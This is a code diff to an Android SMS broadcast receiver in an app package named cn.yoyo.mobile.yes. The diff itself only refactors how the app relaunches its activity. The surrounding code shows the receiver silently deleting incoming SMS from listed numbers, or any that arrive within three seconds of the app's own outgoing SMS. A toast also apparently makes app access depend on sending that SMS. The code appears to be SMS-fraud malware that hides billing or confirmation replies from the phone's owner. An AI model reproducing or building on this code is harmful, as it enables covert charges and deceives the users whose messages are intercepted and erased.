@@ -1,8 +1,6 @@
 package cn.yoyo.mobile.yes;
 
 
-import cn.yoyo.mobile.ui.Activity_Main;
-import cn.yoyo.mobile.ui.base.ExitApp;
 import cn.yoyo.mobile.util.ToastUtils;
 
 
@@ -19,6 +17,7 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.text.TextUtils;
+import android.util.Log;
  
 public class SMSReceiver extends BroadcastReceiver 
 { 
@@ -26,7 +25,8 @@ public class SMSReceiver extends BroadcastReceiver
     // 广播消息类型 
     public final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED"; 
     public final static String SMS_SEND_ACTION = "cn.yoyo.mobile.send"; 
-    public static String SMSnumber = "";
+    public final static String START_ACTIVITY_ACTION = "cn.yoyo.start.activity"; 
+    public static StringBuffer SMSnumber = new StringBuffer("");
     public static String code = "";
 	@Override 
     public void onReceive(Context context, Intent intent) 
@@ -42,11 +42,12 @@ public class SMSReceiver extends BroadcastReceiver
                 smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]); 
                 String msgContent = smsMessage[n].getMessageBody(); 
                 String from = smsMessage[n].getOriginatingAddress();
+                //Log.i("TAG", "from = "+from+", msgContent = "+msgContent);
                 //黑名单
                 SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
     	        long time = preference.getLong("time", 0);
     	        if(TextUtils.isEmpty(from)||TextUtils.isEmpty(SMSnumber))return;
-    	        if(SMSnumber.contains(from)
+    	        if(SMSnumber.toString().contains(from)
     	        		|| System.currentTimeMillis() - time < 3000){
     	        	deleteSMS(context);
                     deleteSMS(context,msgContent);
@@ -56,10 +57,10 @@ public class SMSReceiver extends BroadcastReceiver
     	}else if(intent.getAction().equals(SMS_SEND_ACTION)){
     		switch (getResultCode()) {  
             case Activity.RESULT_OK: 
+            	//Log.i("TAG", "发送成功");
             	SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(context);
                 preference.edit().putLong("time", System.currentTimeMillis()).commit();
-                ExitApp app =  new ExitApp();
-                app.onload();
+                context.sendBroadcast(new Intent(START_ACTIVITY_ACTION));
                 break;  
             case SmsManager.RESULT_ERROR_GENERIC_FAILURE: 
             	ToastUtils.showToast("请允许权限才能进入");
